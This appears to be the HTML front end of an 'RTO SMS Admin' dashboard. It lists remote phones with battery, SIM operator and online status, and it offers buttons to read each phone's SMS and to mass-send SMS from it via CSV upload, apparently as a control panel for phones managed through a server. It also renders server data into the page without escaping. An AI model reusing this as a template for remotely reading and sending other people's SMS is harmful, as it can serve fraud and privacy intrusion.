<!DOCTYPE html>
<html>
<head>
    <title>RTO SMS Admin</title>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: white; padding: 20px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
        .card { background: #1e293b; padding: 20px; border-radius: 12px; border: 1px solid #334155; }
        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
        button { padding: 8px 12px; border-radius: 6px; cursor: pointer; border: none; font-weight: bold; }
        .btn-send { background: #22c55e; color: white; }
        .btn-view { background: #3b82f6; color: white; }
        .btn-details { background: #64748b; color: white; }
        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
        .online { background: #22c55e; }
        .offline { background: #ef4444; }
    </style>
</head>
<body>
    <h2>RTO Device Management</h2>
    <div id="deviceGrid" class="grid">
        </div>

    <input type="file" id="csvFile" style="display:none" accept=".csv">

    <script>
        // Devices list load karne ka function
        async function loadDevices() {
            const res = await fetch('/api/devices');
            const devices = await res.json();
            const container = document.getElementById('deviceGrid');
            container.innerHTML = devices.map(d => `
                <div class="card">
                    <h3>${d.brand} <span class="status-dot ${d.online ? 'online' : 'offline'}"></span></h3>
                    <p>Battery: ${d.battery} | SIM: ${d.sim_operator}</p>
                    <p>ID: ${d.id}</p>
                    <div class="btn-group">
                        <button class="btn-send" onclick="triggerCSV('${d.id}')">Send SMS</button>
                        <button class="btn-view" onclick="viewSMS('${d.id}')">View SMS</button>
                        <button class="btn-details" onclick="showDetails('${d.id}')">Details</button>
                    </div>
                </div>
            `).join('');
        }

        function triggerCSV(deviceId) {
            const input = document.getElementById('csvFile');
            input.onchange = (e) => uploadCSV(e.target.files[0], deviceId);
            input.click();
        }

        async function uploadCSV(file, deviceId) {
            // CSV parsing logic aur API call yahan aayegi
            alert("CSV Uploaded for Device: " + deviceId + ". Tasks created!");
        }

        setInterval(loadDevices, 5000); // Har 5 sec mein refresh
        loadDevices();
    </script>
</body>
</html>
